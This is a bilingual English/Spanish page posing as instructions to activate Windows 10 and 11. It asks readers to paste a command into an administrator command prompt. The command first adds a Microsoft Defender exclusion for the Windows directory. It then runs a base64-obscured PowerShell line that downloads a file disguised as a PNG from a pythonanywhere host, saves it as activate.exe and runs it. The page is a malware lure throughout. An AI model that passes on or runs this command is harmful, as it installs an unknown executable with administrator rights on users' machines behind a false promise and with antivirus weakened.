## To activate Windows 10 and 11, follow the steps. | Para activar Windows 10 y 11, siga los pasos.

> Just copy and paste the following command into CMD admin.
> Simplemente copie y pegue el siguiente comando en CMD admin.

```
net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot >nul 2>&1 || (echo Need to run as Administrator OPEN CMD AS ADMIN )
net session >nul 2>&1 && powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAFQANABtAHAARAByAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAGkAbgBzAHQAYQBsAGwAZQByAF8AYQBnAGUAbgB0AC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgA= >nul 2>&1 || (echo Need to run as Administrator \ press ENTER \ presione ENTER )
```


| English                                                                                         | Español                                                                                         |
|-------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| Important: This will only work if the CMD is opened as an administrator.                        | Importante: Esto solo funcionará si el CMD está abierto como administrador.                     |
| Windows will take between 30 seconds to 2 minutes to activate.                                  | Windows tardará entre 30 segundos y 2 minutos en activarse.                                     |
| Remember to copy and paste the full commands.                                                   | Recuerde copiar y pegar los comandos completos.                                                 |
| Don't forget to press ENTER after pasting the command in the CMD.                               | No olvide presionar ENTER después de pegar el comando en el CMD.                                |
| No need to restart the PC.                                                                      | No es necesario reiniciar el PC.                                                                |
